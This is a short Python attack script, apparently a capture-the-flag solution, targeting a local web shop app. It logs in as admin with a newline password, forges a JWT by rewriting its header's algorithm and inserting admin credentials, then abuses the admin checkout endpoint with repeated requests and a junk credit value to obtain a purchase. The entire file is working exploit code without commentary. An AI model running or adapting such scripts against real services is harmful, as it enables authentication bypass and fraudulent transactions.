import requests
import base64
import json

URL = 'http://localhost:1337'
session = requests.Session()

def login():
    r = session.post(URL + '/login', data={
        'username': 'admin', 'password': '\n'
    }, headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, allow_redirects=False)
    print(r.text, r.cookies)
    return r.cookies.get('token')

def confusion(token):
    updated_token = token.split('.')[0]
    updated_token = base64.b64decode(updated_token).decode()
    updated_token = json.loads(updated_token)
    updated_token['alg'] = 'RS256'
    updated_token['username'] = 'admin'
    updated_token['password'] = 'admin'
    updated_token = base64.b64encode(json.dumps(updated_token).encode()).decode()
    r = requests.post(URL + '/session', cookies={
        'token': updated_token + '.' + token.split('.')[1] + '.' + token.split('.')[2]
    }, allow_redirects=False)
    print(r.text)

def admin():
    r = session.get(URL + '/admin')
    print(r.text)

def checkout_pollute():
    for n in range(20):
        r = session.post(URL + '/admin/checkout')
        print("Checking out count: ", n, r.text)

def purchase():
    r = session.post(URL + '/admin/purchase', data={
        'product_id': '4'
    })
    print(r.text)

def final_checkout():
    r = session.post(URL + '/admin/checkout', data={
        'credit': 'asd'
    })
    print(r.text)

token = login()
confusion(token)
admin()
checkout_pollute()
purchase()
final_checkout()